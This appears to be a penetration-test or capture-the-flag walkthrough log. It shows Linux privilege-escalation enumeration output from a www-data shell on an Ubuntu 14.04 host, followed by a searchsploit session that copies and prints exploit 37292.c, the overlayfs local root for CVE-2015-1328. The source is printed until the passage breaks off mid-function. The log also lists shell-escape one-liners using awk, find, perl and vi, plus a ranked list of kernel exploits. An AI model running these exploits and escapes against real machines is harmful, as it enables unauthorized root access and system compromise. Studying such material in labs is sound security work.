    python 2.7.5-5ubuntu3  interactive high-level object-oriented language (default version)
    python-apt 0.9.3.5  Python interface to libapt-pkg
    python-apt-common 0.9.3.5  Python interface to libapt-pkg (locales)
    python-chardet 2.0.1-2build2  universal character encoding detector
    python-debian 0.1.21+nmu2ubuntu2  Python modules to work with Debian-related data formats
    python-minimal 2.7.5-5ubuntu3  minimal subset of the Python language (default version)
    python-six 1.5.2-1  Python 2 and 3 compatibility library (Python 2 interface)
    python-xapian 1.2.16-2ubuntu1  Xapian search engine interface for Python
    python2.7 2.7.6-8ubuntu0.4  Interactive high-level object-oriented language (version 2.7)
    python2.7-minimal 2.7.6-8ubuntu0.4  Minimal subset of the Python language (version 2.7)
    python3 3.4.0-0ubuntu2  interactive high-level object-oriented language (default python3 version)
    python3-apt 0.9.3.5  Python 3 interface to libapt-pkg
    python3-commandnotfound 0.3ubuntu12  Python 3 bindings for command-not-found.
    python3-dbus 1.2.0-2build2  simple interprocess messaging system (Python 3 interface)
    python3-distupgrade 1:0.220.2  manage release upgrades
    python3-gdbm:amd64 3.4.0-0ubuntu1  GNU dbm database support for Python 3.x
    python3-gi 3.12.0-1  Python 3 bindings for gobject-introspection libraries
    python3-minimal 3.4.0-0ubuntu2  minimal subset of the Python language (default python3 version)
    python3-update-manager 1:0.196.12  python 3.x module for update-manager
    python3.4 3.4.0-2ubuntu1  Interactive high-level object-oriented language (version 3.4)
    python3.4-minimal 3.4.0-2ubuntu1  Minimal subset of the Python language (version 3.4)
    readline-common 6.3-4ubuntu2  GNU readline and history libraries, common files
    resolvconf 1.69ubuntu1.1  name server information handler
    rsync 3.1.0-2ubuntu0.1  fast, versatile, remote (and local) file-copying tool
    rsyslog 7.4.4-1ubuntu2  reliable system and kernel logging daemon
    sed 4.2.2-4ubuntu1  The GNU sed stream editor
    sensible-utils 0.0.9  Utilities for sensible alternative selection
    sgml-base 1.26+nmu4ubuntu1  SGML infrastructure and SGML catalog file support
    shared-mime-info 1.2-0ubuntu3  FreeDesktop.org shared MIME database and spec
    ssl-cert 1.0.33  simple debconf wrapper for OpenSSL
    strace 4.8-1ubuntu5  A system call tracer
    sudo 1.8.9p5-1ubuntu1  Provide limited super user privileges to specific users
    systemd-services 204-5ubuntu20.3  systemd runtime services
    systemd-shim 6-2bzr1  shim for systemd
    sysv-rc 2.88dsf-41ubuntu6  System-V-like runlevel change mechanism
    sysvinit-utils 2.88dsf-41ubuntu6  System-V-like utilities
    tar 1.27.1-1  GNU version of the tar archiving utility
    tasksel 2.88ubuntu15  Tool for selecting tasks for installation on Debian systems
    tasksel-data 2.88ubuntu15  Official tasks used for installation of Debian systems
    tcpd 7.6.q-25  Wietse Venema's TCP wrapper utilities
    tcpdump 4.5.1-2ubuntu1  command-line network traffic analyzer
    telnet 0.17-36build2  The telnet client
    time 1.7-24  GNU time program for measuring CPU resource usage
    tzdata 2014e-0ubuntu0.14.04  time zone and daylight-saving time data
    ubuntu-keyring 2012.05.19  GnuPG keys of the Ubuntu archive
    ubuntu-minimal 1.325  Minimal core of Ubuntu
    ubuntu-release-upgrader-core 1:0.220.2  manage release upgrades
    ubuntu-standard 1.325  The Ubuntu standard system
    ucf 3.0027+nmu1  Update Configuration File(s): preserve user changes to config files
    udev 204-5ubuntu20.3  /dev/ and hotplug management daemon
    ufw 0.34~rc-0ubuntu2  program for managing a Netfilter firewall
    unzip 6.0-9ubuntu1.5  De-archiver for .zip files
    update-manager-core 1:0.196.12  manage release upgrades
    upstart 1.12.1-0ubuntu4.2  event-based init daemon
    ureadahead 0.100.0-16  Read required files in advance
    usbutils 1:007-2ubuntu1  Linux USB utilities
    util-linux 2.20.1-5.1ubuntu20.1  Miscellaneous system utilities
    uuid-runtime 2.20.1-5.1ubuntu20.1  runtime components for the Universally Unique ID library
    vim 2:7.4.052-1ubuntu3.1  Vi IMproved - enhanced vi editor
    vim-common 2:7.4.052-1ubuntu3.1  Vi IMproved - Common files
    vim-runtime 2:7.4.052-1ubuntu3.1  Vi IMproved - Runtime files
    vim-tiny 2:7.4.052-1ubuntu3.1  Vi IMproved - enhanced vi editor - compact version
    wamerican 7.1-1  American English dictionary words for /usr/share/dict
    wbritish 7.1-1  British English dictionary words for /usr/share/dict
    wget 1.15-1ubuntu1  retrieves files from the web
    whiptail 0.52.15-2ubuntu5  Displays user-friendly dialog boxes from shell scripts
    wireless-regdb 2013.02.13-1ubuntu1  wireless regulatory database
    x11-common 1:7.7+1ubuntu8.1  X Window System (X.Org) infrastructure
    xauth 1:1.0.7-1ubuntu1  X authentication utility
    xkb-data 2.10.1-1ubuntu1  X Keyboard Extension (XKB) configuration data
    xml-core 0.13+nmu2  XML infrastructure and XML catalog file support
    xz-utils 5.1.1alpha+20120614-2ubuntu2  XZ-format compression utilities
    zlib1g:amd64 1:1.2.8.dfsg-1ubuntu1  compression library - runtime

[+] Current processes
    USER PID START TIME COMMAND
    root 1 09:47 0:05 /sbin/init
    root 2 09:47 0:00 [kthreadd]
    root 3 09:47 0:00 [ksoftirqd/0]
    root 5 09:47 0:00 [kworker/0:0H]
    root 6 09:47 0:00 [kworker/u30:0]
    root 7 09:47 0:00 [rcu_sched]
    root 8 09:47 0:00 [rcuos/0]
    root 9 09:47 0:00 [rcuos/1]
    root 10 09:47 0:00 [rcuos/2]
    root 11 09:47 0:00 [rcuos/3]
    root 12 09:47 0:00 [rcuos/4]
    root 13 09:47 0:00 [rcuos/5]
    root 14 09:47 0:00 [rcuos/6]
    root 15 09:47 0:00 [rcuos/7]
    root 16 09:47 0:00 [rcuos/8]
    root 17 09:47 0:00 [rcuos/9]
    root 18 09:47 0:00 [rcuos/10]
    root 19 09:47 0:00 [rcuos/11]
    root 20 09:47 0:00 [rcuos/12]
    root 21 09:47 0:00 [rcuos/13]
    root 22 09:47 0:00 [rcuos/14]
    root 23 09:47 0:00 [rcu_bh]
    root 24 09:47 0:00 [rcuob/0]
    root 25 09:47 0:00 [rcuob/1]
    root 26 09:47 0:00 [rcuob/2]
    root 27 09:47 0:00 [rcuob/3]
    root 28 09:47 0:00 [rcuob/4]
    root 29 09:47 0:00 [rcuob/5]
    root 30 09:47 0:00 [rcuob/6]
    root 31 09:47 0:00 [rcuob/7]
    root 32 09:47 0:00 [rcuob/8]
    root 33 09:47 0:00 [rcuob/9]
    root 34 09:47 0:00 [rcuob/10]
    root 35 09:47 0:00 [rcuob/11]
    root 36 09:47 0:00 [rcuob/12]
    root 37 09:47 0:00 [rcuob/13]
    root 38 09:47 0:00 [rcuob/14]
    root 39 09:47 0:00 [migration/0]
    root 40 09:47 0:00 [watchdog/0]
    root 41 09:47 0:00 [khelper]
    root 42 09:47 0:00 [kdevtmpfs]
    root 43 09:47 0:00 [netns]
    root 44 09:47 0:00 [xenwatch]
    root 45 09:47 0:00 [xenbus]
    root 46 09:47 0:00 [kworker/0:1]
    root 47 09:47 0:00 [writeback]
    root 48 09:47 0:00 [kintegrityd]
    root 49 09:47 0:00 [bioset]
    root 50 09:47 0:00 [kworker/u31:0]
    root 51 09:47 0:00 [kblockd]
    root 52 09:47 0:00 [ata_sff]
    root 53 09:47 0:00 [khubd]
    root 54 09:47 0:00 [md]
    root 55 09:47 0:00 [devfreq_wq]
    root 57 09:47 0:00 [khungtaskd]
    root 58 09:47 0:00 [kswapd0]
    root 59 09:47 0:00 [ksmd]
    root 60 09:47 0:00 [fsnotify_mark]
    root 61 09:47 0:00 [ecryptfs-kthrea]
    root 62 09:47 0:00 [crypto]
    root 74 09:47 0:00 [kthrotld]
    root 75 09:47 0:00 [kworker/u30:1]
    root 76 09:47 0:00 [scsi_eh_0]
    root 77 09:47 0:00 [scsi_eh_1]
    root 98 09:47 0:00 [deferwq]
    root 99 09:47 0:00 [charger_manager]
    root 144 09:47 0:00 [kpsmoused]
    root 153 09:47 0:00 [jbd2/xvda1-8]
    root 154 09:47 0:00 [ext4-rsv-conver]
    root 168 09:47 0:00 [kworker/0:2]
    root 333 09:47 0:01 upstart-udev-bridge
    root 352 09:47 0:00 /lib/systemd/systemd-udevd
    message+ 362 09:47 0:00 dbus-daemon
    root 408 09:47 0:00 /lib/systemd/systemd-logind
    root 411 09:47 0:00 upstart-file-bridge
    syslog 414 09:47 0:00 rsyslogd
    root 567 09:47 0:00 dhclient
    root 615 09:47 0:00 upstart-socket-bridge
    root 790 09:47 0:00 /sbin/getty
    root 792 09:47 0:00 /sbin/getty
    root 794 09:47 0:00 /sbin/getty
    root 795 09:47 0:00 /sbin/getty
    root 798 09:47 0:00 /sbin/getty
    root 829 09:47 0:00 /usr/sbin/dovecot
    root 830 09:47 0:00 cron
    dovecot 840 09:47 0:00 dovecot/anvil
    root 841 09:47 0:00 dovecot/log
    postgres 863 09:47 0:00 /usr/lib/postgresql/9.3/bin/postgres
    postgres 869 09:48 0:00 postgres:
    postgres 870 09:48 0:00 postgres:
    postgres 871 09:48 0:00 postgres:
    postgres 872 09:48 0:00 postgres:
    postgres 873 09:48 0:00 postgres:
    root 1001 09:48 0:00 /usr/lib/postfix/master
    postfix 1018 09:48 0:00 qmgr
    root 1072 09:48 0:00 /usr/sbin/apache2
    www-data 1079 09:48 0:00 /usr/sbin/apache2
    www-data 1081 09:48 0:00 /usr/sbin/apache2
    www-data 1082 09:48 0:00 /usr/sbin/apache2
    www-data 1083 09:48 0:00 /usr/sbin/apache2
    root 1109 09:48 0:00 /sbin/getty
    postfix 1131 09:59 0:00 tlsmgr
    root 1182 10:09 0:00 [kauditd]
    www-data 1916 10:57 0:00 /usr/sbin/apache2
    www-data 1917 10:57 0:00 /usr/sbin/apache2
    www-data 1922 10:57 0:00 /usr/sbin/apache2
    www-data 1926 10:57 0:00 /usr/sbin/apache2
    www-data 2225 11:13 0:00 /usr/sbin/apache2
    www-data 2229 11:13 0:00 /usr/sbin/apache2
    postgres 2273 11:25 0:00 postgres:
    www-data 2274 11:25 0:00 sh
    www-data 2276 11:25 0:00 python
    www-data 2277 11:25 0:00 /bin/bash
    www-data 2281 11:25 0:00 python
    www-data 2282 11:25 0:00 /bin/bash
    www-data 2289 11:27 0:00 /usr/sbin/apache2
    postfix 2292 11:28 0:00 pickup
    www-data 2301 11:30 0:00 python
    www-data 3084 11:30 0:00 /bin/sh
    www-data 3085 11:30 0:00 ps
    www-data 3086 11:30 0:00 awk

[+] Apache Version and Modules
    Server version: Apache/2.4.7 (Ubuntu)
    Server built:   Apr 18 2018 15:36:26
    Loaded Modules:
    core_module (static)
    so_module (static)
    watchdog_module (static)
    http_module (static)
    log_config_module (static)
    logio_module (static)
    version_module (static)
    unixd_module (static)
    access_compat_module (shared)
    alias_module (shared)
    auth_basic_module (shared)
    authn_core_module (shared)
    authn_file_module (shared)
    authz_core_module (shared)
    authz_host_module (shared)
    authz_user_module (shared)
    autoindex_module (shared)
    deflate_module (shared)
    dir_module (shared)
    env_module (shared)
    filter_module (shared)
    mime_module (shared)
    mpm_prefork_module (shared)
    negotiation_module (shared)
    php5_module (shared)
    setenvif_module (shared)
    status_module (shared)
    Compiled in modules:
    core.c
    mod_so.c
    mod_watchdog.c
    http_core.c
    mod_log_config.c
    mod_logio.c
    mod_version.c
    mod_unixd.c

[+] Apache Config File
    # This is the main Apache server configuration file.  It contains the
    # configuration directives that give the server its instructions.
    # See http://httpd.apache.org/docs/2.4/ for detailed information about
    # the directives and /usr/share/doc/apache2/README.Debian about Debian specific
    # hints.
    #
    #
    # Summary of how the Apache 2 configuration works in Debian:
    # The Apache 2 web server configuration in Debian is quite different to
    # upstream's suggested way to configure the web server. This is because Debian's
    # default Apache2 installation attempts to make adding and removing modules,
    # virtual hosts, and extra configuration directives as flexible as possible, in
    # order to make automating the changes and administering the server as easy as
    # possible.
    # It is split into several files forming the configuration hierarchy outlined
    # below, all located in the /etc/apache2/ directory:
    #
    #	/etc/apache2/
    #	|-- apache2.conf
    #	|	`--  ports.conf
    #	|-- mods-enabled
    #	|	|-- *.load
    #	|	`-- *.conf
    #	|-- conf-enabled
    #	|	`-- *.conf
    # 	`-- sites-enabled
    #	 	`-- *.conf
    #
    #
    # * apache2.conf is the main configuration file (this file). It puts the pieces
    #   together by including all remaining configuration files when starting up the
    #   web server.
    #
    # * ports.conf is always included from the main configuration file. It is
    #   supposed to determine listening ports for incoming connections which can be
    #   customized anytime.
    #
    # * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
    #   directories contain particular configuration snippets which manage modules,
    #   global configuration fragments, or virtual host configurations,
    #   respectively.
    #
    #   They are activated by symlinking available configuration files from their
    #   respective *-available/ counterparts. These should be managed by using our
    #   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
    #   their respective man pages for detailed information.
    #
    # * The binary is called apache2. Due to the use of environment variables, in
    #   the default configuration, apache2 needs to be started/stopped with
    #   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
    #   work with the default configuration.
    # Global configuration
    #
    #
    # ServerRoot: The top of the directory tree under which the server's
    # configuration, error, and log files are kept.
    #
    # NOTE!  If you intend to place this on an NFS (or otherwise network)
    # mounted filesystem then please read the Mutex documentation (available
    # at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
    # you will save yourself a lot of trouble.
    #
    # Do NOT add a slash at the end of the directory path.
    #
    #ServerRoot "/etc/apache2"
    #
    # The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
    #
    Mutex file:${APACHE_LOCK_DIR} default
    #
    # PidFile: The file in which the server should record its process
    # identification number when it starts.
    # This needs to be set in /etc/apache2/envvars
    #
    PidFile ${APACHE_PID_FILE}
    #
    # Timeout: The number of seconds before receives and sends time out.
    #
    Timeout 300
    #
    # KeepAlive: Whether or not to allow persistent connections (more than
    # one request per connection). Set to "Off" to deactivate.
    #
    KeepAlive On
    #
    # MaxKeepAliveRequests: The maximum number of requests to allow
    # during a persistent connection. Set to 0 to allow an unlimited amount.
    # We recommend you leave this number high, for maximum performance.
    #
    MaxKeepAliveRequests 100
    #
    # KeepAliveTimeout: Number of seconds to wait for the next request from the
    # same client on the same connection.
    #
    KeepAliveTimeout 5
    # These need to be set in /etc/apache2/envvars
    User ${APACHE_RUN_USER}
    Group ${APACHE_RUN_GROUP}
    #
    # HostnameLookups: Log the names of clients or just their IP addresses
    # e.g., www.apache.org (on) or 204.62.129.132 (off).
    # The default is off because it'd be overall better for the net if people
    # had to knowingly turn this feature on, since enabling it means that
    # each client request will result in AT LEAST one lookup request to the
    # nameserver.
    #
    HostnameLookups Off
    # ErrorLog: The location of the error log file.
    # If you do not specify an ErrorLog directive within a <VirtualHost>
    # container, error messages relating to that virtual host will be
    # logged here.  If you *do* define an error logfile for a <VirtualHost>
    # container, that host's errors will be logged there and not here.
    #
    ErrorLog ${APACHE_LOG_DIR}/error.log
    #
    # LogLevel: Control the severity of messages logged to the error_log.
    # Available values: trace8, ..., trace1, debug, info, notice, warn,
    # error, crit, alert, emerg.
    # It is also possible to configure the log level for particular modules, e.g.
    # "LogLevel info ssl:warn"
    #
    LogLevel warn
    # Include module configuration:
    IncludeOptional mods-enabled/*.load
    IncludeOptional mods-enabled/*.conf
    # Include list of ports to listen on
    Include ports.conf
    # Sets the default security model of the Apache2 HTTPD server. It does
    # not allow access to the root filesystem outside of /usr/share and /var/www.
    # The former is used by web applications packaged in Debian,
    # the latter may be used for local directories served by the web server. If
    # your system is serving content from a sub-directory in /srv you must allow
    # access here, or in any related virtual host.
    <Directory />
    Options FollowSymLinks
    AllowOverride None
    Require all denied
    </Directory>
    <Directory /usr/share>
    AllowOverride None
    Require all granted
    </Directory>
    <Directory /var/www/>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
    </Directory>
    #<Directory /srv/>
    #	Options Indexes FollowSymLinks
    #	AllowOverride None
    #	Require all granted
    #</Directory>
    # AccessFileName: The name of the file to look for in each directory
    # for additional configuration directives.  See also the AllowOverride
    # directive.
    #
    AccessFileName .htaccess
    #
    # The following lines prevent .htaccess and .htpasswd files from being
    # viewed by Web clients.
    #
    <FilesMatch "^\.ht">
    Require all denied
    </FilesMatch>
    #
    # The following directives define some format nicknames for use with
    # a CustomLog directive.
    #
    # These deviate from the Common Log Format definitions in that they use %O
    # (the actual bytes sent including headers) instead of %b (the size of the
    # requested file), because the latter makes it impossible to detect partial
    # requests.
    #
    # Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
    # Use mod_remoteip instead.
    #
    LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
    LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
    LogFormat "%h %l %u %t \"%r\" %>s %O" common
    LogFormat "%{Referer}i -> %U" referer
    LogFormat "%{User-agent}i" agent
    # Include of directories ignores editors' and dpkg's backup files,
    # see README.Debian for details.
    # Include generic snippets of statements
    IncludeOptional conf-enabled/*.conf
    # Include the virtual host configurations:
    IncludeOptional sites-enabled/*.conf
    # vim: syntax=apache ts=4 sw=4 sts=4 sr noet

[+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)
    Sudo version 1.8.9p5
    Sudoers policy plugin version 1.8.9p5
    Sudoers file grammar version 43
    Sudoers I/O plugin version 1.8.9p5

[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...

    root 1001 09:48 0:00 /usr/lib/postfix/master
        Possible Related Packages: 
             base-passwd 3.5.33  Debian base system master password and group files
    root 144 09:47 0:00 [kpsmoused]
    root 1182 10:09 0:00 [kauditd]
    root 40 09:47 0:00 [watchdog/0]
    root 46 09:47 0:00 [kworker/0:1]
    root 59 09:47 0:00 [ksmd]
    root 567 09:47 0:00 dhclient
    root 13 09:47 0:00 [rcuos/5]
    root 34 09:47 0:00 [rcuob/10]
    root 33 09:47 0:00 [rcuob/9]
    root 27 09:47 0:00 [rcuob/3]
    root 333 09:47 0:01 upstart-udev-bridge
    root 10 09:47 0:00 [rcuos/2]
    root 411 09:47 0:00 upstart-file-bridge
    root 15 09:47 0:00 [rcuos/7]
    root 39 09:47 0:00 [migration/0]
    root 829 09:47 0:00 /usr/sbin/dovecot
        Possible Related Packages: 
             dovecot-core 1:2.2.9-1ubuntu2.4  secure POP3/IMAP server - core files
             dovecot-pop3d 1:2.2.9-1ubuntu2.4  secure POP3/IMAP server - POP3 daemon
    root 790 09:47 0:00 /sbin/getty
    root 54 09:47 0:00 [md]
    root 47 09:47 0:00 [writeback]
    root 25 09:47 0:00 [rcuob/1]
    root 2 09:47 0:00 [kthreadd]
    root 52 09:47 0:00 [ata_sff]
    root 14 09:47 0:00 [rcuos/6]
    root 76 09:47 0:00 [scsi_eh_0]
    root 1109 09:48 0:00 /sbin/getty
    root 21 09:47 0:00 [rcuos/13]
    root 19 09:47 0:00 [rcuos/11]
    root 5 09:47 0:00 [kworker/0:0H]
    root 30 09:47 0:00 [rcuob/6]
    root 408 09:47 0:00 /lib/systemd/systemd-logind
    root 8 09:47 0:00 [rcuos/0]
    root 98 09:47 0:00 [deferwq]
    root 830 09:47 0:00 cron
        Possible Related Packages: 
             cron 3.0pl1-124ubuntu2  process scheduling daemon
    root 7 09:47 0:00 [rcu_sched]
    root 57 09:47 0:00 [khungtaskd]
    root 36 09:47 0:00 [rcuob/12]
    root 22 09:47 0:00 [rcuos/14]
    root 9 09:47 0:00 [rcuos/1]
    root 58 09:47 0:00 [kswapd0]
    root 44 09:47 0:00 [xenwatch]
    root 23 09:47 0:00 [rcu_bh]
    root 17 09:47 0:00 [rcuos/9]
    root 29 09:47 0:00 [rcuob/5]
    root 6 09:47 0:00 [kworker/u30:0]
    root 153 09:47 0:00 [jbd2/xvda1-8]
    root 3 09:47 0:00 [ksoftirqd/0]
    root 41 09:47 0:00 [khelper]
    root 28 09:47 0:00 [rcuob/4]
    root 60 09:47 0:00 [fsnotify_mark]
    root 12 09:47 0:00 [rcuos/4]
    root 1 09:47 0:05 /sbin/init
        Possible Related Packages: 
             busybox-initramfs 1:1.21.0-1ubuntu1  Standalone shell setup for initramfs
             init-system-helpers 1.14  helper tools for all init systems
             initramfs-tools 0.103ubuntu4.2  tools for generating an initramfs
             initramfs-tools-bin 0.103ubuntu4.2  binaries used by initramfs-tools
             initscripts 2.88dsf-41ubuntu6  scripts for initializing and shutting down the system
             insserv 1.14.0-5ubuntu2  boot sequence organizer using LSB init.d script dependency information
             libklibc 2.0.3-0ubuntu1  minimal libc subset for use with initramfs
             lsb-base 4.1+Debian11ubuntu6  Linux Standard Base 4.1 init script functionality
             module-init-tools 15-0ubuntu6  transitional dummy package (module-init-tools to kmod)
             ncurses-base 5.9+20140118-1ubuntu1  basic terminal type definitions
             sysvinit-utils 2.88dsf-41ubuntu6  System-V-like utilities
             upstart 1.12.1-0ubuntu4.2  event-based init daemon
    root 48 09:47 0:00 [kintegrityd]
    root 1072 09:48 0:00 /usr/sbin/apache2
        Possible Related Packages: 
             apache2 2.4.7-1ubuntu4.20  Apache HTTP Server
             apache2-bin 2.4.7-1ubuntu4.20  Apache HTTP Server (binary files and modules)
             apache2-data 2.4.7-1ubuntu4.20  Apache HTTP Server (common files)
             apache2-utils 2.4.7-1ubuntu4.20  Apache HTTP Server (utility programs for web servers)
             libapache2-mod-php5 5.5.9+dfsg-1ubuntu4.24  server-side, HTML-embedded scripting language (Apache 2 module)
    root 38 09:47 0:00 [rcuob/14]
    root 99 09:47 0:00 [charger_manager]
    root 352 09:47 0:00 /lib/systemd/systemd-udevd
    root 26 09:47 0:00 [rcuob/2]
    root 20 09:47 0:00 [rcuos/12]
    root 841 09:47 0:00 dovecot/log
        Possible Related Packages: 
             libllvm3.4:amd64 1:3.4-1ubuntu3  Modular compiler and toolchain technologies, runtime library
             liblog-message-simple-perl 0.10-1  simplified interface to Log::Message
             libparse-debianchangelog-perl 1.2.0-1ubuntu1  parse Debian changelogs and output them in other formats
             libplymouth2:amd64 0.8.8-0ubuntu17  graphical boot animation and logger - shared libraries
             libsystemd-login0:amd64 204-5ubuntu20.3  systemd login utility library
             llvm-3.4 1:3.4-1ubuntu3  Modular compiler and toolchain technologies
             llvm-3.4-dev 1:3.4-1ubuntu3  Modular compiler and toolchain technologies, libraries and headers
             llvm-3.4-runtime 1:3.4-1ubuntu3  Modular compiler and toolchain technologies, IR interpreter
             login 1:4.1.5.1-1ubuntu9  system login tools
             logrotate 3.8.7-1ubuntu1  Log rotation utility
             plymouth 0.8.8-0ubuntu17  graphical boot animation and logger - main package
             plymouth-theme-ubuntu-text 0.8.8-0ubuntu17  graphical boot animation and logger - ubuntu-logo theme
             rsyslog 7.4.4-1ubuntu2  reliable system and kernel logging daemon
             sgml-base 1.26+nmu4ubuntu1  SGML infrastructure and SGML catalog file support
             whiptail 0.52.15-2ubuntu5  Displays user-friendly dialog boxes from shell scripts
             xml-core 0.13+nmu2  XML infrastructure and XML catalog file support
    root 794 09:47 0:00 /sbin/getty
    root 11 09:47 0:00 [rcuos/3]
    root 77 09:47 0:00 [scsi_eh_1]
    root 42 09:47 0:00 [kdevtmpfs]
    root 168 09:47 0:00 [kworker/0:2]
    root 31 09:47 0:00 [rcuob/7]
    root 792 09:47 0:00 /sbin/getty
    root 45 09:47 0:00 [xenbus]
    root 75 09:47 0:00 [kworker/u30:1]
    root 18 09:47 0:00 [rcuos/10]
    root 795 09:47 0:00 /sbin/getty
    root 53 09:47 0:00 [khubd]
    root 798 09:47 0:00 /sbin/getty
    root 615 09:47 0:00 upstart-socket-bridge
    root 49 09:47 0:00 [bioset]
    root 50 09:47 0:00 [kworker/u31:0]
    root 61 09:47 0:00 [ecryptfs-kthrea]
    root 51 09:47 0:00 [kblockd]
    root 35 09:47 0:00 [rcuob/11]
    root 43 09:47 0:00 [netns]
    root 16 09:47 0:00 [rcuos/8]
    root 62 09:47 0:00 [crypto]
    root 37 09:47 0:00 [rcuob/13]
    root 55 09:47 0:00 [devfreq_wq]
    root 74 09:47 0:00 [kthrotld]
    root 32 09:47 0:00 [rcuob/8]
    root 24 09:47 0:00 [rcuob/0]
    root 154 09:47 0:00 [ext4-rsv-conver]

[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...

[+] Installed Tools
    /usr/bin/awk
    /usr/bin/perl
    /usr/bin/python
    /usr/bin/cc
    /usr/bin/vi
    /usr/bin/vim
    /usr/bin/find
    /bin/netcat
    /bin/nc
    /usr/bin/wget
    /usr/bin/ftp

[+] Related Shell Escape Sequences...

    vi-->	:!bash
    vi-->	:set shell=/bin/bash:shell
    vi-->	:!bash
    vi-->	:set shell=/bin/bash:shell
    awk-->	awk 'BEGIN {system("/bin/bash")}'
    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
    perl-->	perl -e 'exec "/bin/bash";'

[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...

    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!

    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system

    The following exploits are applicable to this kernel version and should be investigated as well
    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**
    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c

Finished
=================================================================================================
www-data@ubuntu:/tmp$ 

www-data@ubuntu:/tmp$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

┌──(kali㉿kali)-[~/Downloads]
└─$ searchsploit 3.13 ubuntu
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.0 | linux/local/37292.c


┌──(kali㉿kali)-[~/Downloads]
└─$ searchsploit -m linux/local/37292.c 
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)
Copied to: /home/kali/Downloads/37292.c


                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ cat 37292.c      
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
user@ubuntu-server-1504:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)

greets to beist & kaliman
2015-05-24
%rebel%
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>

#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"

static char child_stack[1024*1024];

static int
child_exec(void *stuff)
{
    char *file;
    system("rm -rf /tmp/ns_sploit");
    mkdir("/tmp/ns_sploit", 0777);
    mkdir("/tmp/ns_sploit/work", 0777);
    mkdir("/tmp/ns_sploit/upper",0777);
    mkdir("/tmp/ns_sploit/o",0777);

    fprintf(stderr,"mount #1\n");
